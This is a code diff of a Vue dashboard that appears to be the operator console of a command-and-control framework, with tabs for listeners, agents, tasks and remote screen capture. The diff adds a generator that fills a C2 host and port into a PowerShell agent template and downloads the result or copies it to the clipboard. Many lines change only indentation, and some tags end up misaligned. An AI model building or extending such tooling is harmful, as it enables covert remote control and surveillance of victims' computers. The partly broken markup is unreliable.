@@ -1,7 +1,7 @@
 <template>
   <div class="dashboard">
     <h1>🎯 Dashboard</h1>
-    
+
     <!-- Main Dashboard Tabs -->
     <el-tabs v-model="activeTab" type="card" class="dashboard-tabs">
       
@@ -50,7 +50,7 @@
           </el-table>
         </div>
       </el-tab-pane>
-      
+
       <!-- Listeners Tab -->
       <el-tab-pane label="Listeners" name="listeners">
         <div class="tab-content">
@@ -77,11 +77,11 @@
             <div class="stat-card">
               <h4>Total Profiles</h4>
               <span class="stat-number">{{ listeners.length }}</span>
-            </div>
+          </div>
             <div class="stat-card">
               <h4>Active Profiles</h4>
               <span class="stat-number">{{ activeProfilesCount }}</span>
-            </div>
+        </div>
             <div class="stat-card">
               <h4>TLS Enabled</h4>
               <span class="stat-number">{{ tlsProfilesCount }}</span>
@@ -131,16 +131,67 @@
           </el-table>
         </div>
       </el-tab-pane>
-      
+
       <!-- VNC Tab -->
       <el-tab-pane label="VNC" name="vnc">
         <div class="tab-content">
           <div class="section-header">
             <h3>🖥️ VNC Screen Capture</h3>
-            <el-button type="primary" @click="startVNCCapture">
-              <el-icon><VideoPlay /></el-icon>
-              Start Capture
+            <div style="display: flex; gap: 10px;">
+              <el-button type="primary" @click="startVNCCapture">
+                <el-icon><VideoPlay /></el-icon>
+                Start Capture
             </el-button>
+              <el-button type="success" @click="generateVNCAgent">
+                <el-icon><Download /></el-icon>
+                Generate Agent
+                </el-button>
+          </div>
+          </div>
+          
+          <!-- VNC Agent Generator -->
+          <div class="vnc-generator" style="margin-bottom: 20px;">
+            <el-card>
+              <template #header>
+                <h4>🔧 VNC Agent Generator</h4>
+              </template>
+              <el-form :model="vncConfig" label-width="120px">
+              <el-row :gutter="20">
+                <el-col :span="12">
+                    <el-form-item label="C2 Host:">
+                      <el-input v-model="vncConfig.c2Host" placeholder="192.168.0.111" />
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                    <el-form-item label="C2 Port:">
+                      <el-input v-model="vncConfig.c2Port" placeholder="23457" />
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              <el-row :gutter="20">
+                <el-col :span="12">
+                    <el-form-item label="Poll Interval:">
+                      <el-input v-model="vncConfig.pollInterval" placeholder="5" />
+                  </el-form-item>
+                </el-col>
+                <el-col :span="12">
+                    <el-form-item label="Use TLS:">
+                      <el-switch v-model="vncConfig.useTLS" />
+                  </el-form-item>
+                </el-col>
+              </el-row>
+              <el-form-item>
+                  <el-button type="primary" @click="generateVNCAgent">
+                    <el-icon><Download /></el-icon>
+                    Generate VNC Agent
+                </el-button>
+                  <el-button @click="copyAgentCode">
+                    <el-icon><CopyDocument /></el-icon>
+                    Copy Code
+                </el-button>
+              </el-form-item>
+            </el-form>
+            </el-card>
           </div>
           
           <div class="vnc-container">
@@ -166,11 +217,11 @@
                 <div v-else class="vnc-loading">
                   <el-icon class="is-loading"><Loading /></el-icon>
                   <p>Capturing screen...</p>
-                </div>
-              </div>
             </div>
           </div>
-        </div>
+              </div>
+                </div>
+              </div>
       </el-tab-pane>
       
       <!-- Tasks Tab -->
@@ -181,15 +232,15 @@
             <el-button type="primary" @click="createTask">
               <el-icon><Plus /></el-icon>
               Create Task
-            </el-button>
+                </el-button>
           </div>
-          
+              
           <div v-if="tasks.length === 0" class="empty-state">
             <el-icon size="64" color="#909399"><Document /></el-icon>
             <h3>No Tasks</h3>
             <p>Create tasks to manage agent operations.</p>
-          </div>
-          
+            </div>
+            
           <el-table v-else :data="tasks" style="width: 100%">
             <el-table-column prop="id" label="Task ID" width="120" />
             <el-table-column prop="agentId" label="Agent" width="120" />
@@ -199,7 +250,7 @@
                 <el-tag :type="getTaskStatusType(scope.row.status)">
                   {{ scope.row.status }}
                 </el-tag>
-              </template>
+                </template>
             </el-table-column>
             <el-table-column prop="createdAt" label="Created" width="150" />
             <el-table-column prop="result" label="Result" width="200" />
@@ -212,7 +263,7 @@
               </template>
             </el-table-column>
           </el-table>
-        </div>
+    </div>
       </el-tab-pane>
       
     </el-tabs>
@@ -224,7 +275,8 @@ import { ref, computed, onMounted } from 'vue'
 import { ElMessage, ElMessageBox } from 'element-plus'
 import { 
   Delete, Refresh, Setting, Plus, Edit, View, Close, 
-  Monitor, VideoPlay, VideoPause, Document, Loading 
+  Monitor, VideoPlay, VideoPause, Document, Loading,
+  Download, CopyDocument
 } from '@element-plus/icons-vue'
 
 // Reactive data
@@ -235,6 +287,12 @@ const tasks = ref<any[]>([])
 const cleaning = ref(false)
 const vncActive = ref(false)
 const vncImage = ref('')
+const vncConfig = ref({
+  c2Host: '192.168.0.111',
+  c2Port: '23457',
+  pollInterval: '5',
+  useTLS: true
+})
 
 // Computed properties
 const activeProfilesCount = computed(() => 
@@ -252,7 +310,7 @@ const uniquePortsCount = computed(() =>
 // Load profiles function
 const loadProfiles = async () => {
   try {
-    const response = await fetch('/api/profile/list')
+    const response = await fetch('http://localhost:8080/api/profile/list')
     
     if (!response.ok) {
       ElMessage.error(`Failed to load profiles: Server returned ${response.status} ${response.statusText}`)
@@ -297,7 +355,7 @@ const loadProfiles = async () => {
 // Load agents
 const refreshAgents = async () => {
   try {
-    const response = await fetch('/api/agents')
+    const response = await fetch('http://localhost:8080/api/agents')
     if (response.ok) {
       const data = await response.json()
       agents.value = data.agents || []
@@ -313,7 +371,7 @@ const refreshAgents = async () => {
 // Load tasks
 const loadTasks = async () => {
   try {
-    const response = await fetch('/api/tasks')
+    const response = await fetch('http://localhost:8080/api/tasks')
     if (response.ok) {
       const data = await response.json()
       tasks.value = data.tasks || []
@@ -335,9 +393,9 @@ const cleanupDuplicateProfiles = async () => {
     
     if (duplicates.length === 0) {
       ElMessage.info('No duplicate profiles found to clean up.')
-      return
-    }
-    
+    return
+  }
+  
     const result = await ElMessageBox.confirm(
       `Found ${duplicates.length} duplicate profiles. This will keep only the most recent version of each unique profile. Continue?`,
       'Cleanup Duplicates',
@@ -402,10 +460,10 @@ const deleteProfile = async (profileId: string) => {
     )
     
     if (result === 'confirm') {
-      const response = await fetch(`/api/profile/delete/${profileId}`, {
-        method: 'DELETE'
-      })
-      
+      const response = await fetch(`http://localhost:8080/api/profile/delete/${profileId}`, {
+      method: 'DELETE'
+    })
+    
       if (response.ok) {
         ElMessage.success('Profile deleted successfully.')
         await loadProfiles()
@@ -424,7 +482,7 @@ const deleteProfile = async (profileId: string) => {
 // VNC functions
 const startVNCCapture = async () => {
   try {
-    const response = await fetch('/api/vnc/start', { method: 'POST' })
+    const response = await fetch('http://localhost:8080/api/vnc/start', { method: 'POST' })
     if (response.ok) {
       vncActive.value = true
       ElMessage.success('VNC capture started.')
@@ -440,7 +498,7 @@ const startVNCCapture = async () => {
 
 const stopVNCCapture = async () => {
   try {
-    const response = await fetch('/api/vnc/stop', { method: 'POST' })
+    const response = await fetch('http://localhost:8080/api/vnc/stop', { method: 'POST' })
     if (response.ok) {
       vncActive.value = false
       vncImage.value = ''
@@ -458,7 +516,7 @@ const refreshVNC = async () => {
   if (!vncActive.value) return
   
   try {
-    const response = await fetch('/api/vnc/screenshot')
+    const response = await fetch('http://localhost:8080/api/vnc/screenshot')
     if (response.ok) {
       const blob = await response.blob()
       vncImage.value = URL.createObjectURL(blob)
@@ -491,11 +549,11 @@ const disconnectAgent = async (agentId: string) => {
       if (response.ok) {
         ElMessage.success('Agent disconnected.')
         refreshAgents()
-      } else {
+            } else {
         ElMessage.error('Failed to disconnect agent.')
+        }
       }
-    }
-  } catch (error) {
+    } catch (error) {
     if (error !== 'cancel') {
       console.error('Disconnect failed:', error)
       ElMessage.error('Failed to disconnect agent.')
@@ -530,6 +588,72 @@ const createListener = () => {
 const editListener = (listener: any) => {
   ElMessage.info(`Editing listener: ${listener.name}`)
   // TODO: Implement listener edit
+}
+
+// VNC Agent Generator functions
+const generateVNCAgent = async () => {
+  try {
+    const config = vncConfig.value
+    
+    // Fetch the template from the backend
+    const response = await fetch('http://localhost:8080/api/agent/template')
+    if (!response.ok) {
+      ElMessage.error('Failed to fetch VNC agent template')
+      return
+    }
+    
+    let template = await response.text()
+    
+    // Replace placeholders with actual values
+    template = template
+      .replace(/{{C2_HOST}}/g, config.c2Host)
+      .replace(/{{C2_PORT}}/g, config.c2Port)
+      .replace(/{{GENERATED_DATE}}/g, new Date().toLocaleString())
+    
+    // Create a blob and download
+    const blob = new Blob([template], { type: 'text/plain' })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement('a')
+    a.href = url
+    a.download = `vnc_agent_${config.c2Host}_${config.c2Port}.ps1`
+    document.body.appendChild(a)
+    a.click()
+    document.body.removeChild(a)
+    URL.revokeObjectURL(url)
+    
+    ElMessage.success('VNC Agent generated and downloaded!')
+  } catch (error) {
+    console.error('Failed to generate VNC agent:', error)
+    ElMessage.error('Failed to generate VNC agent')
+  }
+}
+
+const copyAgentCode = async () => {
+  try {
+    const config = vncConfig.value
+    
+    // Fetch the template from the backend
+    const response = await fetch('http://localhost:8080/api/agent/template')
+    if (!response.ok) {
+      ElMessage.error('Failed to fetch VNC agent template')
+      return
+    }
+    
+    let template = await response.text()
+    
+    // Replace placeholders with actual values
+    template = template
+      .replace(/{{C2_HOST}}/g, config.c2Host)
+      .replace(/{{C2_PORT}}/g, config.c2Port)
+      .replace(/{{GENERATED_DATE}}/g, new Date().toLocaleString())
+    
+    // Copy to clipboard
+    await navigator.clipboard.writeText(template)
+    ElMessage.success('VNC Agent code copied to clipboard!')
+  } catch (error) {
+    console.error('Failed to copy VNC agent code:', error)
+    ElMessage.error('Failed to copy VNC agent code')
+  }
 }
 
 // Format date
@@ -572,7 +696,7 @@ h1 {
 
 .dashboard-tabs {
   background: white;
-  border-radius: 8px;
+      border-radius: 8px;
   box-shadow: 0 2px 4px rgba(0,0,0,0.1);
 }
 
@@ -586,16 +710,16 @@ h1 {
   align-items: center;
   margin-bottom: 20px;
 }
-
+  
 .section-header h3 {
-  margin: 0;
+    margin: 0;
   color: #303133;
-}
-
-.stats-grid {
+  }
+  
+  .stats-grid {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-  gap: 15px;
+    gap: 15px;
   margin-bottom: 20px;
 }
 
